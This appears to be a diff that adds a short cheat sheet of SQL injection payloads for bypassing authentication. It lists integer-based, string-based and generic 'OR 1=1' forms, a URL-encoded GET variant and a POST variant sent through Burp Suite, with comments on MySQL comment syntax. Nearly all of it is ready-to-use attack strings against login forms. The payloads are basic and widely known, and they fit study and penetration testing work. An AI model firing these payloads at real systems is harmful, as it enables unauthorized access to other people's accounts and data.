@@ -1,1 +1,43 @@
+# SQL Injection Payloads – Part 1 (Authentication Bypass)
 
+# ----------------------------------------
+# 1. Integer-Based Injection
+# ----------------------------------------
+# Used when input expects numeric values
+1 or 1=1-- -
+
+# ----------------------------------------
+# 2. String-Based Injection
+# ----------------------------------------
+# Used when input is inside quotes
+1' or '1'='1'-- -
+
+# ----------------------------------------
+# 3. Generic Authentication Bypass
+# ----------------------------------------
+' OR 1=1-- -
+
+# ----------------------------------------
+# 4. URL (GET) Injection
+# ----------------------------------------
+# Example payload used in URL parameters
+-1' or 1=1-- -
+
+# URL Encoded Version:
+# '  -> %27
+# space -> %20
+# Example:
+# -1%27%20or%201=1--%20-
+
+# ----------------------------------------
+# 5. POST Injection (Burp Suite)
+# ----------------------------------------
+# Injected via intercepted request
+1' or '1'='1'-- -
+
+# ----------------------------------------
+# Notes:
+# ----------------------------------------
+# -- - is used for commenting remaining query
+# MySQL requires space after --
+# These payloads exploit unsanitized input in dynamic SQL queries
